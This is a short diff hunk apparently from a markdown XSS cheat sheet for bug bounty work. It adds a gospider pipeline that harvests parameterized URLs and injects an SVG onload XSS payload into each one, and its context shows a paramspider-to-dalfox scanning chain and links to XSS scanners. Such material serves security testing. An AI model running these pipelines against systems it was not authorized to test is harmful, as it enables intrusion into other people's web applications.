@@ -853,6 +853,10 @@ alert("XSS");
 python3 paramspider.py -d https://target.com -s TRUE -e ttf,woff,eot,svg,css | deduplicate | sed '1,4d' | httpx -silent | dalfox pipe -S | cut -d " " -f2
 ```
 
+```bash
+gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+```
+
 * [XSSTRON](https://github.com/RenwaX23/XSSTRON) - Powerful Chromium Browser to find XSS Vulnerabilites automatically while browsing web, it can detect many case scenarios with support for POST requests too
 
 * [XSS-Radar](https://github.com/bugbountyforum/XSS-Radar) - XSS Radar is a tool that detects parameters and fuzzes them for cross-site scripting vulnerabilities
